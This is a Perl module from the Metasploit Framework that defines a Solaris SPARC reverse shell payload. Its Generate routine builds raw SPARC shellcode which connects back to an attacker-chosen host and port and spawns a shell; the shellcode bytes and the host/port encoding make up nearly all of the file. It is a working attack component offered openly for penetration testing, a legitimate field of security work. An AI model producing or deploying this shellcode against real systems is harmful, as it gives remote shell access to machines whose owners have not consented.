
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::solaris_sparc_reverse;
use base 'Msf::PayloadComponent::ReverseConnection';
use strict;
use Pex::SPARC;

my $info =
{
  'Name'         => 'Solaris SPARC Reverse Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>', ],
  'Arch'         => [ 'sparc' ],
  'Priv'         => 0,
  'OS'           => [ 'solaris' ],
  'Size'         => '',
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT')));
}

sub Generate {
  my $self = shift;
  my $host = shift;
  my $port = shift;

  my $host_bin = unpack("N", gethostbyname($host));
 
  my $shellcode =
    "\x9c\x2b\xa0\x07\x98\x10\x20\x01\x96\x1a\xc0\x0b\x94\x1a\xc0\x0b".
    "\x92\x10\x20\x02\x90\x10\x20\x02\x82\x10\x20\xe6\x91\xd0\x20\x08".
    "\xd0\x23\xbf\xf8\x94\x10\x20\x03\x92\x10\x20\x09\x94\xa2\xa0\x01".
    "\x82\x10\x20\x3e\x91\xd0\x20\x08\x12\xbf\xff\xfc\xd0\x03\xbf\xf8".
    Pex::SPARC::set(0x20000 | $port, "l0").
    Pex::SPARC::set($host_bin, "l1").
    "\xe0\x3b\xbf\xf0\x92\x23\xa0\x10\x94\x10\x20\x10\x82\x10\x20\xeb".
    "\x91\xd0\x20\x08\x94\x1a\xc0\x0b\x21\x0b\xd8\x9a\xa0\x14\x21\x6e".
    "\x23\x0b\xdc\xda\x90\x23\xa0\x10\x92\x23\xa0\x08\xe0\x3b\xbf\xf0".
    "\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08";

  return $shellcode;
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('127.0.0.1', 4444);
  return(length($bin));
}

1;
